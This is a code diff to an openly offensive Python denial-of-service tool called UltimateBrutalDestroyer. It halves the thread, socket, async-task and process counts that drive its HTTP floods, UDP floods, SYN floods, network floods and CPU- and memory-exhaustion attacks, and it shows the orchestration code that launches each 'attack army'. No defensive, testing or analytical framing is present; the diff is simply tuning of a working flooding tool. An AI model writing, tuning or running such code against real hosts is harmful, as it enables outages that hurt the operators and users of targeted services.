@@ -44,12 +44,12 @@ class UltimateBrutalDestroyer:
         self.lock = threading.Lock()
         self.running = True
         
-        # System resources - MAXIMUM POWER for ultimate destruction
+        # System resources - HALVED for better stability
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 1000  # 1000 workers per CPU core for maximum power
-        self.max_sockets = 20000  # Maximum socket connections
-        self.max_async_tasks = 10000  # Maximum async tasks
-        self.max_processes = self.cpu_count * 2  # Double the CPU cores for processes
+        self.max_workers = self.cpu_count * 500  # Reduced from 1000 to 500 workers per CPU core
+        self.max_sockets = 10000  # Reduced from 20000 to 10000
+        self.max_async_tasks = 5000  # Reduced from 10000 to 5000
+        self.max_processes = self.cpu_count  # Reduced from cpu_count * 2 to cpu_count
         
         # Thread pool for better efficiency
         self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)
@@ -477,7 +477,7 @@ class UltimateBrutalDestroyer:
                     self.failed_requests += 1
         
         # Submit many tasks to thread pool
-        for _ in range(1000):  # Submit 1000 tasks at once
+        for _ in range(500):  # Reduced from 1000 to 500 tasks at once
             if not self.running:
                 break
             future = self.thread_pool.submit(single_attack)
@@ -507,10 +507,10 @@ class UltimateBrutalDestroyer:
         # Start all attack types
         threads = []
         
-        # 1. Multi-threaded HTTP attacks - ULTRA FAST CREATION
+        # 1. Multi-threaded HTTP attacks - HALVED for speed
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 500  # Much larger batches for speed
-        max_threads = min(self.max_workers, 3000)  # Reduced to 3000 for faster creation
+        thread_batch_size = 250  # Reduced from 500 to 250
+        max_threads = min(self.max_workers, 1500)  # Reduced from 3000 to 1500
         
         for batch in range(0, max_threads, thread_batch_size):
             batch_end = min(batch + thread_batch_size, max_threads)
@@ -532,30 +532,30 @@ class UltimateBrutalDestroyer:
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
         
-        # 2. Fast Thread Pool Attack - ULTRA EFFICIENT
+        # 2. Fast Thread Pool Attack - HALVED
         print("⚡ Starting fast thread pool attack...")
-        for i in range(self.cpu_count * 2):  # 2x CPU cores for thread pool attacks
+        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
             pool_thread = threading.Thread(target=self.fast_thread_pool_attack, daemon=True)
             pool_thread.start()
             threads.append(pool_thread)
         
-        # 3. CPU-intensive attacks
+        # 3. CPU-intensive attacks - HALVED
         print("🔥 Starting CPU-intensive attacks...")
-        for i in range(self.cpu_count * 2):  # Reduced from 4x to 2x for faster startup
+        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
             cpu_thread = threading.Thread(target=self.cpu_intensive_attack, daemon=True)
             cpu_thread.start()
             threads.append(cpu_thread)
         
-        # 4. Memory-intensive attacks
+        # 4. Memory-intensive attacks - HALVED
         print("💾 Starting memory-intensive attacks...")
-        for i in range(self.cpu_count):  # Reduced from 2x to 1x for faster startup
+        for i in range(max(1, self.cpu_count // 2)):  # Reduced from cpu_count to cpu_count // 2
             memory_thread = threading.Thread(target=self.memory_intensive_attack, daemon=True)
             memory_thread.start()
             threads.append(memory_thread)
         
-        # 5. Network flood attacks
+        # 5. Network flood attacks - HALVED
         print("🌊 Starting network flood attacks...")
-        for i in range(self.cpu_count * 2):  # Reduced from 3x to 2x for faster startup
+        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
             network_thread = threading.Thread(target=self.network_flood_attack, daemon=True)
             network_thread.start()
             threads.append(network_thread)
@@ -599,21 +599,21 @@ class UltimateBrutalDestroyer:
         async_thread.start()
         threads.append(async_thread)
         
-        # 8. UDP flood
+        # 8. UDP flood - HALVED
         print("💥 Starting UDP flood...")
-        for i in range(self.cpu_count):
+        for i in range(max(1, self.cpu_count // 2)):  # Reduced from cpu_count to cpu_count // 2
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
-        # 9. SYN flood simulation
+        # 9. SYN flood simulation - HALVED
         print("🔥 Starting SYN flood simulation...")
-        for i in range(self.cpu_count * 2):
+        for i in range(self.cpu_count):  # Reduced from cpu_count * 2 to cpu_count
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
-        # 10. Multi-process attack - MAXIMUM POWER
+        # 10. Multi-process attack - HALVED
         print("🚀 Starting process army...")
         process_pool = ProcessPoolExecutor(max_workers=self.max_processes)
         process_futures = []
